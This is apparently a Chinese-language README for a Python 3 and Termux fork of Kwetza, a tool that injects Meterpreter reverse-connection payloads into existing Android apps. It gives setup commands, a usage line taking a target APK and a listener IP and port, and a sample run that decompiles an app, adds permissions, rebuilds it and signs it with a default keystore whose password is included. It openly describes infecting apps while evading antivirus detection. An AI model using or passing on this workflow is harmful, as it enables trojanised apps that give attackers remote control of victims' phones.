# 介绍
By Chris Le Roy (@brompwnie) chris@sensepost.com

Kwetza是一种工具，可让您将Meterpreter payload植入到Android应用程序。
# 修改说明  
以下问题均出现在手机Termux终端上<br/>
1.指定脚本使用python3执行<br/>
2.修复语法错误:调用“print”时缺少括号<br/>
3.修复需要一个类似于bytes的对象，而不是'str'<br/>
4.修复'utf-8'编解码器无法解码字节0xa4在位置4:无效的开始字节<br/>

# 它有什么作用？

Kwetza使用自定义或默认payload模板感染现有的Android应用程序，以避免被杀病毒软件检测出来。Kwetza允许您使用目标应用程序的默认权限感染Android应用程序，或注入其他权限以获得其他功能。
# 在哪里可以获得博客文章？
可以在以下位置找到由Kwetza自动化的手动步骤：https://sensepost.com/blog/2016/kwetza-infecting-android-applications/

# 获取代码

首先获取代码：
```
git clone https://github.com/2487686673/Kwetza.git
```

Kwetza用Python编写，需要BeautifulSoup，可以使用pip安装：
```
pip install beautifulsoup4
```
Kwetza要求安装Apktool并可以通过您的PATH访问。可以使用位于此处的安装说明进行设置：https://ibotpeaches.github.io/Apktool/install

安装lxml解释器：<br>
使用Termux安装lxml需要先安装好依赖环境<br>
<br>
1.libxml2<br>
2.libxslt<br>
3.libiconv<br>
<br>
使用apt-get安装以上包，然后再执行pip install lxml即可<br>
# 用法
```
python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no customClass
```
* nameOfTheApkToInfect.apk = 希望植入payload的apk文件名

* LHOST = 监听IP

* LPORT = 监听端口

* yes/no = 选择yes则会添加额外的权限，选择no则会利用app原来的权限

* customClass = 如果希望Kwetza注入到此活动，请在此处指定自定义活动。

```
python kwetza.py hackme.apk https 10.42.0.118 4444 yes com.moo.another.activity
[+] MMMMMM KWETZA
[*] DECOMPILING TARGET APK
[+] ENDPOINT IP: 10.42.0.118
[+] ENDPOINT PORT: 4444
[+] APKTOOL DECOMPILED SUCCESS
[*] BYTING COMMS...
[*] ANALYZING ANDROID MANIFEST...
[+] TARGET ACTIVITY: com.foo.moo.gui.MainActivity
[*] INJECTION INTO APK
[+] CHECKING IF ADDITIONAL PERMS TO BE ADDED
[*] INJECTION OF CRAZY PERMS TO BE DONE!
[+] TIME TO BUILD INFECTED APK
[*] EXECUTING APKTOOL BUILD COMMAND
[+] BUILD RESULT
############################################
I: Using APktool 2.2.0
I: Checking whether source shas changed...
I: Smaling smali folder into classes.dex
I: Checking whether resources has changed...
I: Building resources...
I: Copying libs ...(/lib)
I: Building apk file...
I: Copying unknown files/dir...
###########################################
[*] EXECUTING JARSIGNER COMMAND...
Enter Passphrase for keystore: password
[+] JARSIGNER RESULT
###########################################
jar signed.

###########################################

[+] L00t located at hackme/dist/hackme.apk
```


# 信息
Kwetza以Python2开发。

Kwetza默认会使用payload文件夹下的模板和keystore在apk中植入恶意payload。

如果要用自己的证书签署应用，把你的keystore重命名为mykey.keystore放在payload文件夹下。

你也可以用同样的方法替换默认的payload模板

默认keystore的密码是”password”

# License

Kwetza is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0).

Permissions beyond the scope of this license may be available at http://sensepost.com/contact
